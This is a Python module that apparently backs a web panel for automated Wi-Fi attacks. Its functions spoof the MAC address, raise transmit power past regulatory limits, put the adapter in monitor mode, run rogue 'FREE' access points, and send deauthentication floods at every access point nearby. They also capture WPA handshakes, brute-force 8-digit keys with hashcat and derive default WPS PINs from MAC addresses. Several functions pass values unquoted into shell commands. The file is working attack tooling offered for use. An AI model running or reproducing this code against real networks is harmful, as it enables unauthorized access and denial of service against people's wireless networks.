from . import *

__all__ = ['network_manager_stop', 'network_manager_read_conf', 'change_mac',
           'network_manager_start', 'get_network_manager_status', 'get_ls',
           'get_uptime', 'connecting_wifi', 'get_networks', 'get_ifconfig',
           'get_iwconfig', 'change_power', 'get_airmon_check', 'free_port',
           'set_airmon_check_kill', 'set_airmon_mode_monitor', 'set_airodump',
           'set_hcxdumptool', 'set_mode_managed', 'get_pids', 'get_iw_list',
           'get_iwlist_scan', 'get_iw_wlan_info', 'set_wlan_mode_monitor',
           'set_wlan_set_type_monitor', 'set_add_mon_type_monitor', 'get_ps',
           'get_iw_dev_info', 'set_del_mon_interface', 'set_hcxpcapngtool',
           'set_wpa_supplicant_stop', 'set_wpa_supplicant_start',
           'get_wpa_supplicant_status', 'set_hashcat', 'get_mac_to_wpspin',
           'get_name_to_mac', 'get_iwlist_wlan_scan_ssid', 'set_mdk3_fake_ap',
           'set_airbase_fake_ap', 'set_mdk3_deauthentication', 'change_channel',
           'set_aireplay_deauthentication', 'set_pyrit_striplive']


def model(cmd, arg):
    args: List[str] = request.args.getlist(arg)
    clean = [shlex.quote(i) for i in args]
    full_command = shlex.split(f"{cmd} {''.join(clean)}")
    result = subprocess.run(full_command, capture_output=True).stdout.decode()
    return result


def change_mac():
    cmd = [f"ifconfig {WLAN} down",
           f"ifconfig {WLAN} hw ether 00:11:22:33:44:55",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return "<h2><font color='green'>mac address changed</h2></font>"


def change_power():
    cmd = [f"ifconfig {WLAN} down",
           "iw reg set BZ",
           f"iwconfig {WLAN} txpower 30",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2><font color='green'>txpower {WLAN} changed</h2></font>"


def change_channel(ch):
    cmd = f"iwconfig {WLAN} channel {ch}"
    subprocess.call(cmd, shell=True)
    return f"<h2><font color='green'>channel {WLAN} changed on </font>{ch}</h2>"


def network_manager_stop():
    cmd = 'service NetworkManager stop'
    subprocess.run(cmd, shell=True)
    return "<h2>NetworkManager <font color='red'>stopped</h2></font>"


def network_manager_start():
    cmd = 'service NetworkManager start'
    subprocess.run(cmd, shell=True)
    return "<h2>NetworkManager <font color='green'>started</h2></font>"


def get_network_manager_status():
    return model(cmd='service NetworkManager status', arg='')


def network_manager_read_conf():
    result = model(cmd='cat /etc/NetworkManager/NetworkManager.conf', arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_wpa_supplicant_stop():
    if 'running' in get_network_manager_status()[135:163]:
        return ("<h2><font color='red'>First you need to stop service "
                "</font>NetworkManager</h2>")
    cmd = 'systemctl stop wpa_supplicant.service'
    subprocess.run(cmd, shell=True)
    return "<h2>wpa supplicant <font color='red'>stopped</font></h2>"


def set_wpa_supplicant_start():
    cmd = 'systemctl start wpa_supplicant.service'
    subprocess.run(cmd, shell=True)
    return "<h2>wpa supplicant <font color='green'>started</font></h2>"


def get_wpa_supplicant_status():
    return model(cmd='systemctl status wpa_supplicant.service', arg='')


def get_airmon_check():
    result = model(cmd='airmon-ng', arg='check')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_airmon_check_kill():
    result = model(cmd='airmon-ng check kill', arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_airmon_mode_monitor():
    result = model(cmd=f'airmon-ng start {WLAN}', arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_wlan_mode_monitor():
    cmd = [f"ifconfig {WLAN} down",
           f"iwconfig {WLAN} mode monitor",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"


def set_wlan_set_type_monitor():
    cmd = [f"ip link set {WLAN} down",
           f"iw dev {WLAN} set type monitor",
           f"ip link set {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"


def set_add_mon_type_monitor():
    cmd = f"iw {WLAN} interface add {MON} type monitor"
    subprocess.call(cmd, shell=True)
    return f"<h2>{WLAN} added mon mode <font color='red'>monitor</font></h2>"


def set_mode_managed():
    cmd = [f"airmon-ng stop {WLAN}mon",
           f"ifconfig {WLAN}mon down",
           f"ifconfig {WLAN} down",
           f"iwconfig {WLAN} mode managed",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>{WLAN} mode changed to <font color='green'>managed</font></h2>"


def set_del_mon_interface():
    cmd = [f"iw dev {MON} del",
           f"iw dev {WLAN}mon del"]
    [subprocess.call(i, shell=True) for i in cmd]
    return "<h2>virtual interface <font color='red'>delete</font></h2>"


def set_airodump():
    result = model(cmd=f'airodump-ng {WLAN}mon', arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_airbase_fake_ap():
    set_add_mon_type_monitor()
    cmd = f"airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
    result = model(cmd=cmd, arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_mdk3_fake_ap():
    set_add_mon_type_monitor()
    cmd = f"mdk3 {MON} b -v fake_ap -g -m"
    # cmd = f"mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
    result = model(cmd=cmd, arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_mdk3_deauthentication():
    # cmd = f"mdk3 {WLAN} d -c 1"
    cmd = f"mdk3 {WLAN} d"
    result = model(cmd=cmd, arg='')
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_aireplay_deauthentication():
    mac = get_iwlist_wlan_scan_mac()
    # cmd = f"aireplay-ng -0 0 -D {WLAN}"
    result = [model(cmd=f"aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
    return f"<h2><font color='black'><pre>{result}</pre></font></h2>"


def set_pyrit_striplive():
    cmd = f'pyrit -r {WLAN} -o {DUMP} stripLive'
    subprocess.run(cmd, shell=True)
    return f"<h2><font color='black'><pre>|result|</pre></font></h2>"


def set_hcxdumptool():
    cmd = f'{PATH} -i {WLAN} -w {DUMP}'
    # cmd = f'hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
    # result = subprocess.call(cmd, shell=True)
    subprocess.run(cmd, shell=True)
    return f"<h2><font color='black'><pre>|result|</pre></font></h2>"


def set_hcxpcapngtool():
    if Path(DUMP).exists():
        cmd = f'hcxpcapngtool -o {HASH} -E wordlist {DUMP}'
        subprocess.run(cmd, shell=True)
        Path(DUMP).rename('old_' + DUMP)
    if Path(HASH).exists():
        hashes = model(cmd=f'cat {HASH}', arg='')
        data = []
        with open(HASH, 'r') as text:
            for line in text:
                data.append(line.split('*'))
        result = '<p>List of found routers:</p><ul>'
        for item in data:
            word = bytes.fromhex(item[5]).decode()
            result += f'<li>{word}</li>'
        return f"<h2>{hashes}<font color='green'>{result}</ul></font></h2>"
    return f"<h2><font color='red'>NOT FOUND</font></h2>"


def set_hashcat():
    # cmd = f"hashcat -m 22000 {HASH} /usr/share/dict/wordlist-probable.txt"
    cmd = f"hashcat -m 22000 {HASH} -a 3 ?d?d?d?d?d?d?d?d"
    subprocess.run(cmd, shell=True)
    return 'result'


def get_mac_to_wpspin(mac: str) -> str:
    one = two = (int(mac, 16) & 0xFFFFFF) % 10000000
    var1 = 0
    while two:
        var1 += 3 * (two % 10)
        two = floor(two / 10)
        var1 += two % 10
        two = floor(two / 10)
    var2 = (one * 10) + ((10 - (var1 % 10)) % 10)
    var3 = str(int(var2))
    wpspin = var3.zfill(8)
    return f"<h2>Mac: {mac}. WPSPIN: <font color='blue'>{wpspin}</font></h2>"


def get_name_to_mac(name) -> str:
    result = model(cmd="iwlist scan", arg='')
    ap = ''
    for cell in result.split('Cell'):
        if name in cell[210:263]:
            ap += f'<pre>{cell[:263]}</pre>'
    if not ap:
        return "<h2><font color='red'>NOT FOUND</font></h2>"
    return f"<h2><font color='blue'><pre>{ap}</pre></font></h2>"


def get_ifconfig() -> str:
    command = "ifconfig"
    result = subprocess.run(command, capture_output=True).stdout.decode()
    return f"<h3><font color='blue'><pre>{result}</pre></font></h3>"


def get_iwconfig() -> str:
    command = "iwconfig"
    result = subprocess.run(command, capture_output=True).stdout.decode()
    return f"<h3><font color='blue'><pre>{result}</pre></font></h3>"


def get_iwlist_scan() -> str:
    result = model(cmd="iwlist scan", arg='')
    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"


def get_iw_list() -> str:
    result = model(cmd="iw list", arg='')
    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"


def get_iwlist_wlan_scan_ssid() -> str:
    # cmd = "iwlist scan | grep Address"
    cmd = "iwlist scan | grep ESSID"
    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
    output = '\n'.join(sys.stdout.split('\n'))
    return f"<h2><font color='blue'><pre>{output}</pre></font></h2>"


def get_iwlist_wlan_scan_mac() -> set:
    cmd = "iwlist scan | grep Address"
    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
    output = set([i.strip() for i in sys.stdout.split(' ') if '\n' in i])
    return output


def get_iw_wlan_info() -> str:
    result = model(cmd=f"iw {WLAN} info", arg='')
    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"


def get_iw_dev_info() -> str:
    result = model(cmd="iw dev", arg='')
    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"


def get_networks() -> str:
    result = model(cmd="nmcli dev wifi", arg='con')
    return f"<h3><font color='purple'><pre>{result}</pre></font></h3>"


def connecting_wifi() -> str:
    result = model(cmd=f"nmcli dev wifi con '{AP}' password {PASS}", arg='')
    return f"<h2><font color='green'><pre>{result}</pre></font></h2>"


def get_ps() -> str:
    result = model(cmd="ps", arg='arg')
    return f"<h2><font color='blue'><pre>{result}</pre></font></h2>"


def get_uptime() -> str:
    stdout = sys.stdout
    sys.stdout = subprocess.check_output(
        'uptime', shell=True).decode('utf-8').strip().split(' ')
    output = [i for i in sys.stdout]
    sys.stdout = stdout
    html = f"<h3><font color='blue'>Current uptime is {output[0]}</font></h3>"
    return html


def get_ls() -> str:
    result = model(cmd="ls -lia", arg='')
    return f"<h3><font color='blue'><pre>{result}</pre></font></h3>"


def get_pids(port: int) -> (List[int], List[str]):
    """ Returns a list of pid processes occupying the given port """
    pids: List[int] = []
    proc: List[str] = []
    cmd = f"lsof -i :{port}"
    args = shlex.split(cmd)
    output = subprocess.run(args, capture_output=True)
    result = str(output.stdout).split('\\n')[1:]
    [pids.append(int(i.split()[1])) for i in result if len(i) > 1]
    [proc.append(f'{i.split()[0]}: {int(i.split()[1])}')
     for i in result if len(i) > 1]
    return pids, proc


def free_port(port: int) -> None:
    """ Terminates processes occupying the given port """
    pids: List[int] = get_pids(port)[0]
    [kill(pid, signal.SIGINT) for pid in pids if pids]
